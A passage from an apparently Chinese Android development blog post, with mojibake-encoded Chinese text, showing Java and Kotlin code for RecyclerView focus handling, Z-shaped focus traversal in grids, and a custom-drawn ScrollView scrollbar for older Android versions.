                    delta = getDecoratedLeft(focusedChild) - parentLeft;
                }
            }
            <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨å³ä¾§è¢«è£å‰ª (éœ€è¦å‘å³æ»šåŠ¨) ------------------</span>
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getDecoratedRight(focusedChild) &gt;= (parentRight - decoratedMeasuredWidth)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„æœ€åä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯æœ€åä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©ä¸‹ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition == lastVisiblePos &amp;&amp; focusedPosition &lt; getItemCount() - <span class="hljs-number">1</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">nextView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition + <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (nextView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†ä¸‹ä¸€ä¸ª View çš„å³è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å³è¾¹ç¼˜</span>
                        delta = getDecoratedRight(nextView) - parentRight;
                        Log.d(TAG, <span class="hljs-string">"H Scroll Right: Target next view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedRight(focusedChild) - parentRight + decoratedMeasuredWidth;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„å³è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å³è¾¹ç¼˜</span>
                    delta = getDecoratedRight(focusedChild) - parentRight;
                }
            }

        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// --- å‚ç›´æ–¹å‘ ---</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">parentTop</span> <span class="hljs-operator">=</span> getPaddingTop();
            <span class="hljs-type">int</span> <span class="hljs-variable">parentBottom</span> <span class="hljs-operator">=</span> getHeight() - getPaddingBottom();
            <span class="hljs-type">int</span> <span class="hljs-variable">decoratedMeasuredHeight</span> <span class="hljs-operator">=</span> getDecoratedMeasuredHeight(focusedChild);
            <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨é¡¶éƒ¨è¢«è£å‰ª (éœ€è¦å‘ä¸Šæ»šåŠ¨) ------------------</span>
            <span class="hljs-keyword">if</span> (getDecoratedTop(focusedChild) &lt;= (decoratedMeasuredHeight + parentTop)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„ç¬¬ä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯ç¬¬ä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©å‰ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">previousView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition - <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (previousView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†å‰ä¸€ä¸ª View çš„é¡¶éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„é¡¶éƒ¨</span>
                        delta = getDecoratedTop(previousView)  - parentTop;
                        Log.d(TAG, <span class="hljs-string">"V Scroll Up: Target previous view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœå‰ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedTop(focusedChild) - decoratedMeasuredHeight - parentTop;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„é¡¶éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„é¡¶éƒ¨</span>
                    delta = getDecoratedTop(focusedChild) - parentTop;
                }

                <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨åº•éƒ¨è¢«è£å‰ª (éœ€è¦å‘ä¸‹æ»šåŠ¨) ------------------</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getDecoratedBottom(focusedChild) &gt;= (parentBottom - decoratedMeasuredHeight)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„æœ€åä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯æœ€åä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©ä¸‹ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition &lt; getItemCount() - <span class="hljs-number">1</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">nextView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition + <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (nextView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†ä¸‹ä¸€ä¸ª View çš„åº•éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„åº•éƒ¨</span>
                        delta = getDecoratedBottom(nextView) - parentBottom;
                        Log.d(TAG, <span class="hljs-string">"V Scroll Down: Target next view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedBottom(focusedChild) - parentBottom + decoratedMeasuredHeight;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„åº•éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„åº•éƒ¨</span>
                    delta = getDecoratedBottom(focusedChild) - parentBottom;
                }
            }
        }

        <span class="hljs-keyword">return</span> delta;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smoothScrollToPosition</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-meta">@NonNull</span> RecyclerView.State state, <span class="hljs-type">int</span> position)</span> {
        <span class="hljs-type">EdgeSmoothScroller</span> <span class="hljs-variable">smoothScroller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EdgeSmoothScroller</span>(recyclerView.getContext());
        smoothScroller.setTargetPosition(position);
        startSmoothScroll(smoothScroller);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeSmoothScroller</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearSmoothScroller</span> {

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">EdgeSmoothScroller</span><span class="hljs-params">(Context context)</span> {
            <span class="hljs-built_in">super</span>(context);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">float</span> <span class="hljs-title function_">calculateSpeedPerPixel</span><span class="hljs-params">(DisplayMetrics displayMetrics)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-number">100f</span> / displayMetrics.densityDpi;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDxToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDyToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTargetFound</span><span class="hljs-params">(View targetView, RecyclerView.State state, Action action)</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(targetView);

            <span class="hljs-type">int</span> <span class="hljs-variable">dx</span> <span class="hljs-operator">=</span> (getOrientation() == HORIZONTAL) ? delta : <span class="hljs-number">0</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">dy</span> <span class="hljs-operator">=</span> (getOrientation() == VERTICAL) ? delta : <span class="hljs-number">0</span>;

            <span class="hljs-type">int</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> calculateTimeForDeceleration(Math.abs(delta));
            <span class="hljs-keyword">if</span> (time &gt; <span class="hljs-number">0</span>) {
                action.update(dx, dy, time, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecelerateInterpolator</span>());
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-10">æœªå±•ç¤ºItemViewèšç„¦</h4>
<p>ä»¥ä¸Šä¸¤ä¸ªLayoutManageræ˜¯ä¸ºäº†è§£å†³ä¸¢ç„¦é—®é¢˜ï¼Œä½†è¿˜æœ‰ä¸ªæ£˜æ‰‹çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“RecyclerViewçš„ä¸Šçš„Viewåªæ˜¯éƒ¨åˆ†Viewï¼Œå¦‚ä½•è®©æŒ‡å®šä½ç½®çš„Viewèšç„¦å‘¢ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ä¹‹å‰ä¹Ÿè¯´è¿‡ï¼Œè‡ªç„¶æ˜¯å…ˆæ»šåŠ¨åˆ°å…·ä½“ä½ç½®ï¼Œå†èšç„¦ï¼Œä¸‹é¢æ˜¯æˆ‘ä»¬çš„å…·ä½“é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestFocusedChild</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span> {
    Log.d(TAG,<span class="hljs-string">"requestFocus -&gt; "</span> + position);
    <span class="hljs-keyword">if</span> (mRecycleView == <span class="hljs-literal">null</span> || dataAdapter == <span class="hljs-literal">null</span> || mRecycleView.getLayoutManager() == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span>;
    }
    Log.d(TAG,<span class="hljs-string">"requestFocusOnPosition -&gt; "</span> + position);
    <span class="hljs-keyword">if</span>(requestFocusOnPosition(position)){
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">if</span>(dataAdapter.getItemCount() &gt; position &amp;&amp; position &gt;= <span class="hljs-number">0</span>){
        scrollToTopInstantly(mRecycleView,position);
        mRecycleView.postDelayed(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                Log.d(TAG,<span class="hljs-string">"post requestFocus -&gt; "</span> + position);
                requestFocusOnPosition(position);
            }
        },<span class="hljs-number">100</span>);

    }
}

<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">requestFocusOnPosition</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span> {

    <span class="hljs-keyword">if</span>(mListView == <span class="hljs-literal">null</span>){
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    RecyclerView.<span class="hljs-type">LayoutManager</span> <span class="hljs-variable">layoutManager</span> <span class="hljs-operator">=</span> mRecycleView.getLayoutManager();
    <span class="hljs-keyword">if</span>(layoutManager == <span class="hljs-literal">null</span>){
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> layoutManager.findViewByPosition(position);
    <span class="hljs-keyword">if</span> (view != <span class="hljs-literal">null</span> &amp;&amp; view.getWindowId() != <span class="hljs-literal">null</span>) {
        view.requestFocus();
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span>  <span class="hljs-literal">false</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scrollToTopInstantly</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> position)</span> {
    RecyclerView.<span class="hljs-type">LayoutManager</span> <span class="hljs-variable">layoutManager</span> <span class="hljs-operator">=</span> recyclerView.getLayoutManager();

    <span class="hljs-keyword">if</span> (layoutManager <span class="hljs-keyword">instanceof</span> LinearLayoutManager) {
        <span class="hljs-type">LinearLayoutManager</span> <span class="hljs-variable">lm</span> <span class="hljs-operator">=</span> (LinearLayoutManager) layoutManager;

        <span class="hljs-comment">// ä½¿ç”¨ scrollToPositionWithOffsetï¼Œå°† offset è®¾ç½®ä¸º 0ï¼Œå³å¯ä¿è¯ Item æ»šåŠ¨åˆ°é¡¶éƒ¨</span>
        lm.scrollToPositionWithOffset(position, <span class="hljs-number">0</span>);
        Log.d(TAG, <span class="hljs-string">"Instantly scrolled to position "</span> + position + <span class="hljs-string">" at top with offset 0."</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¯¹äºéçº¿æ€§å¸ƒå±€ï¼ˆå¦‚ StaggeredGridLayoutManagerï¼‰ï¼Œå¯èƒ½éœ€è¦å…¶ä»–ç­–ç•¥ã€‚</span>
        Log.w(TAG, <span class="hljs-string">"LayoutManager is not LinearLayoutManager. Using basic scrollToPosition."</span>);
        recyclerView.scrollToPosition(position);
    }
}

</code></pre>
<h4 data-id="heading-11">Zå­—å½¢èµ°ç„¦</h4>
<p>ä»€ä¹ˆæ˜¯èµ°ç„¦ç‚¹å‘¢ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œç½‘æ ¼å±•ç¤ºå¯èƒ½éœ€è¦ç”¨åˆ°è¿™ç§æ–¹æ³•ã€‚</p>
<p>ç½‘æ ¼ä¸­æŒ‰å·¦æˆ–è€…å³é”®ï¼Œå¦‚æœè¾¹ç¼˜Viewèšç„¦ï¼ŒæŒ‰å·¦é”®ï¼Œå¯èƒ½æ— æ³•èšç„¦åˆ°å…¶ä»–Viewã€‚äºæ˜¯ï¼Œéœ€æ±‚ä¾§å¸Œæœ›ä»ååˆ°å‰æˆ–è€…ä»å‰åˆ°åä¾æ¬¡éå†ItemViewï¼Œä¹Ÿå°±æ˜¯Zå­—å½¢éå†ã€‚</p>
<p>é‚£è¿™ç§æˆ‘ä»¬çš„åŠæ³•å½“ç„¶æ˜¯è·å–å½“å‰Itemæ‰€åœ¨RecyclerViewä¸­å¯ä»¥èšç„¦çš„Itemï¼Œå¼ºåˆ¶è®¾ç½®ç„¦ç‚¹å³å¯ï¼Œé‡ç‚¹æ˜¯ä½¿ç”¨ä¸‹é¢æ–¹æ³•ã€‚</p>
<p>recyclerView.addFocusables(focusableViews, direction)</p>
<p>ä¸‹é¢æ˜¯æºç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-built_in">this</span>.adapter!!.setBorderFocusListener { focused, direction -&gt;

    <span class="hljs-keyword">if</span>(direction == FOCUS_LEFT || direction == FOCUS_RIGHT){
        <span class="hljs-comment">//æ‰¾åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ </span>
        <span class="hljs-type">val</span> <span class="hljs-variable">focusableViews</span> <span class="hljs-operator">=</span> java.util.ArrayList&lt;View&gt;()
        recyclerView.addFocusables(focusableViews, direction)
        <span class="hljs-keyword">if</span> (focusableViews.isEmpty()) {
            <span class="hljs-keyword">return</span><span class="hljs-meta">@setBorderFocusListener</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-comment">// ç„¦ç‚¹è§„åˆ™éµå¾ªZå­—å‹åŸåˆ™</span>
        <span class="hljs-keyword">for</span> (index in focusableViews.indices) {
            <span class="hljs-type">val</span> <span class="hljs-variable">focusableView</span> <span class="hljs-operator">=</span> focusableViews[index]
            <span class="hljs-keyword">if</span> (focusableView === focused) {
                <span class="hljs-type">val</span> <span class="hljs-variable">nextFocusedViewIndex</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">if</span> (direction == FOCUS_LEFT) index - <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> index + <span class="hljs-number">1</span>
                <span class="hljs-keyword">if</span> (nextFocusedViewIndex &gt;= <span class="hljs-number">0</span> &amp;&amp; nextFocusedViewIndex &lt; focusableViews.size) {
                    <span class="hljs-type">val</span> <span class="hljs-variable">nextFocusableView</span> <span class="hljs-operator">=</span> focusableViews[nextFocusedViewIndex]
                    nextFocusableView.requestFocus()
                    <span class="hljs-keyword">return</span><span class="hljs-meta">@setBorderFocusListener</span> <span class="hljs-literal">true</span>
                }

                <span class="hljs-keyword">if</span>(nextFocusedViewIndex &lt; <span class="hljs-number">0</span> || nextFocusedViewIndex &gt;= adapter!!.itemCount){
                    <span class="hljs-keyword">return</span><span class="hljs-meta">@setBorderFocusListener</span> <span class="hljs-literal">true</span>
                }

                <span class="hljs-keyword">break</span>
            }
        }
    }
    <span class="hljs-literal">false</span>
}
</code></pre>
<h3 data-id="heading-12">Scrollbaræ— æ³•èšç„¦</h3>
<p>ScrollViewçš„ScrollBarå¦‚æœè®¾ç½®Selector Drawableï¼Œåœ¨Android 6.0ä¸Šæ— æ³•èšç„¦åå˜è‰²ï¼Œè¿™ç§æƒ…å†µå…¶å®æ˜¯æ—©æœŸAndroidç³»ç»Ÿçš„é—®é¢˜ï¼ŒåŒ…æ‹¬androidxçš„NestScrollViewä¹Ÿå¹¶æ²¡æœ‰è§£å†³æ­¤é—®é¢˜ã€‚</p>
<p>é‚£ï¼Œè¿™é‡Œæˆ‘ä»¬çš„è§£å†³æ–¹æ³•å½“ç„¶æ˜¯è‡ªè¡Œç»˜åˆ¶äº†</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScrollbarFixScrollView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScrollView</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Paint paint;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RectF</span> <span class="hljs-variable">rect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RectF</span>();

    <span class="hljs-comment">// æ»šåŠ¨æ¡çš„ç”»ç¬”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SCROLLBAR_WIDTH_DP</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;
    <span class="hljs-comment">// æ»šåŠ¨æ¡çš„æœ€å°é«˜åº¦ï¼ˆé˜²æ­¢å†…å®¹è¿‡é•¿æ—¶å¤ªå°ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MIN_THUMB_HEIGHT_DP</span> <span class="hljs-operator">=</span> <span class="hljs-number">16</span>;
    <span class="hljs-comment">// æ»šåŠ¨æ¡çš„åœ†è§’åŠå¾„</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">SCROLLBAR_RADIUS_DP</span> <span class="hljs-operator">=</span> <span class="hljs-number">2f</span>;

    <span class="hljs-comment">// dpåˆ°pxçš„è½¬æ¢ç³»æ•°</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> mDensity;

    <span class="hljs-keyword">private</span> FocusSearchListener focusSearchListener;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScrollbarFixScrollView</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-built_in">super</span>(context);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScrollbarFixScrollView</span><span class="hljs-params">(Context context, AttributeSet attrs)</span> {
        <span class="hljs-built_in">super</span>(context, attrs);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScrollbarFixScrollView</span><span class="hljs-params">(Context context, AttributeSet attrs, <span class="hljs-type">int</span> defStyleAttr)</span> {
        <span class="hljs-built_in">super</span>(context, attrs, defStyleAttr);
    }


    {

        <span class="hljs-built_in">this</span>.paint = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Paint</span>();
        <span class="hljs-comment">// åˆå§‹åŒ–ç”»ç¬”ï¼šè®¾ç½®é¢œè‰²å’Œæ ·å¼</span>
        <span class="hljs-built_in">this</span>.paint.setAntiAlias(<span class="hljs-literal">true</span>); <span class="hljs-comment">// æŠ—é”¯é½¿</span>
        <span class="hljs-built_in">this</span>.paint.setStyle(Paint.Style.FILL);
        <span class="hljs-built_in">this</span>.mDensity = getContext().getResources().getDisplayMetrics().density;
        <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.M) {
            setHorizontalScrollBarEnabled(<span class="hljs-literal">false</span>);
            setVerticalScrollBarEnabled(<span class="hljs-literal">false</span>);
            refreshScrollbarState(<span class="hljs-literal">false</span>);
        }

    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocusChanged</span><span class="hljs-params">(<span class="hljs-type">boolean</span> gainFocus, <span class="hljs-type">int</span> direction, Rect previouslyFocusedRect)</span> {
        <span class="hljs-built_in">super</span>.onFocusChanged(gainFocus, direction, previouslyFocusedRect);
        <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT &lt;= Build.VERSION_CODES.M) {
            refreshScrollbarState(gainFocus);
        }

    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshScrollbarState</span><span class="hljs-params">(<span class="hljs-type">boolean</span> gainFocus)</span> {
        <span class="hljs-keyword">if</span>(gainFocus) {
            paint.setColor(<span class="hljs-number">0xFFF04F43</span>);
        }<span class="hljs-keyword">else</span>{
            paint.setColor(<span class="hljs-number">0xFFBDBDBD</span>);
        }
    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatchDraw</span><span class="hljs-params">(Canvas canvas)</span> {
        <span class="hljs-built_in">super</span>.dispatchDraw(canvas);

        <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT &gt; Build.VERSION_CODES.M) {
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-keyword">if</span> (!checkScrollViewCanScroll()) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// å¦‚æœScrollViewæ²¡æœ‰å­Viewï¼Œæˆ–è€…å†…å®¹ä¸å¯æ»šåŠ¨ï¼Œåˆ™æ— éœ€ç»˜åˆ¶</span>
        <span class="hljs-keyword">if</span> (getChildCount() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// è·å–å†…å®¹ View</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">View</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> getChildAt(<span class="hljs-number">0</span>);

        <span class="hljs-comment">// è§†å›¾é«˜åº¦ï¼ˆScrollViewçš„å¯è§†åŒºåŸŸé«˜åº¦ï¼‰</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">viewportHeight</span> <span class="hljs-operator">=</span> getHeight();
        <span class="hljs-comment">// å†…å®¹æ€»é«˜åº¦</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">contentHeight</span> <span class="hljs-operator">=</span> content.getHeight();

        <span class="hljs-comment">// å½“å‰æ»šåŠ¨çš„Yè½´åç§»é‡</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">scrollY</span> <span class="hljs-operator">=</span> getScrollY();

        <span class="hljs-comment">// å¦‚æœå†…å®¹æ¯”å¯è§†åŒºåŸŸå°ï¼Œä¸ç»˜åˆ¶æ»šåŠ¨æ¡</span>
        <span class="hljs-keyword">if</span> (contentHeight &lt;= viewportHeight) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// ------------------ 2. æ»šåŠ¨æ¡é«˜åº¦è®¡ç®— ------------------</span>

        <span class="hljs-comment">// æ»šåŠ¨æ¡å®½åº¦ (è½¬æ¢ä¸ºåƒç´ )</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">thumbWidth</span> <span class="hljs-operator">=</span> SCROLLBAR_WIDTH_DP * mDensity;

        <span class="hljs-comment">// æ»šåŠ¨æ¡çš„ç†è®ºæ¯”ä¾‹é«˜åº¦</span>
        <span class="hljs-type">float</span> <span class="hljs-variable">thumbHeightRatio</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>) viewportHeight / contentHeight;
        <span class="hljs-type">float</span> <span class="hljs-variable">thumbHeight</span> <span class="hljs-operator">=</span> thumbHeightRatio * viewportHeight;

        <span class="hljs-comment">// é™åˆ¶æ»šåŠ¨æ¡æœ€å°é«˜åº¦ (è½¬æ¢ä¸ºåƒç´ )</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">minThumbHeight</span> <span class="hljs-operator">=</span> MIN_THUMB_HEIGHT_DP * mDensity;
        <span class="hljs-keyword">if</span> (thumbHeight &lt; minThumbHeight) {
            thumbHeight = minThumbHeight;
        }

        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">maxScrollRange</span> <span class="hljs-operator">=</span> contentHeight - viewportHeight;
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">maxThumbTravel</span> <span class="hljs-operator">=</span> viewportHeight - thumbHeight;
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">scrollRatio</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>) scrollY / maxScrollRange;
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">thumbY</span> <span class="hljs-operator">=</span> scrollRatio * maxThumbTravel;

        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">rightX</span> <span class="hljs-operator">=</span> getWidth();
        <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">leftX</span> <span class="hljs-operator">=</span> rightX - thumbWidth;

        rect.set(leftX, thumbY + scrollY, rightX, thumbY + scrollY + thumbHeight);
        <span class="hljs-type">float</span> <span class="hljs-variable">radius</span> <span class="hljs-operator">=</span> SCROLLBAR_RADIUS_DP * mDensity;
        canvas.drawRoundRect(rect, radius, radius, paint);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkScrollViewCanScroll</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ScrollView</span> <span class="hljs-variable">contentScrollView</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;
        <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> contentScrollView.getChildAt(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">if</span> (child != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">int</span> <span class="hljs-variable">childHeight</span> <span class="hljs-operator">=</span> child.getHeight();
            <span class="hljs-keyword">return</span> contentScrollView.getHeight() &lt; childHeight + contentScrollView.getPaddingTop() + contentScrollView.getPaddingBottom();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFocusSearchListener</span><span class="hljs-params">(FocusSearchListener focusSearchListener)</span> {
        <span class="hljs-built_in">this</span>.focusSearchListener = focusSearchListener;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">focusSearch</span><span class="hljs-params">(<span class="hljs-type">int</span> direction)</span> {
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.focusSearchListener != <span class="hljs-literal">null</span>){
            <span class="hljs-type">View</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> findFocus();
            <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.focusSearchListener.onFocusSearch(current, direction);
            <span class="hljs-keyword">if</span>(view != <span class="hljs-literal">null</span>){
                <span class="hljs-keyword">return</span> view;
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.focusSearch(direction);
    }
}
</code></pre>
